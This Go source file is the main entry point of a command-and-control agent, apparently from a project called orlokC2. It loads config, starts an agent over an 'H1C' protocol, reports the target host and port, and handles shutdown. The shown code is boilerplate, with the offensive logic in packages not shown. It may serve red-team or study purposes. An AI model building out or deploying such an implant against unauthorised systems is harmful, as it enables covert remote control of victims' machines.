package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"orlokC2_final/internal/agent/agent"
	"orlokC2_final/internal/agent/config"
	"orlokC2_final/internal/agent/protocols/h1c"
	"orlokC2_final/internal/agent/uuid"
)

func main() {
	// Initialize configuration with defaults
	agentConfig := config.DefaultConfig()

	// Use the embedded UUID
	agentConfig.AgentUUID = uuid.AgentUUID

	// Create H1C protocol instance
	protocol := &h1c.H1CProtocol{}

	// Create agent instance
	c2Agent := agent.New(agentConfig, protocol)

	// Set up signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Start agent
	err := c2Agent.Start()
	if err != nil {
		fmt.Printf("Failed to start agent: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Agent started - UUID: %s\n", agentConfig.AgentUUID)
	fmt.Printf("Connected to: %s:%d using %s\n",
		agentConfig.TargetHost,
		agentConfig.TargetPort,
		protocol.GetType())

	// Wait for termination signal
	<-sigChan

	// Gracefully stop the agent
	fmt.Println("Shutting down agent...")
	c2Agent.Stop()
}
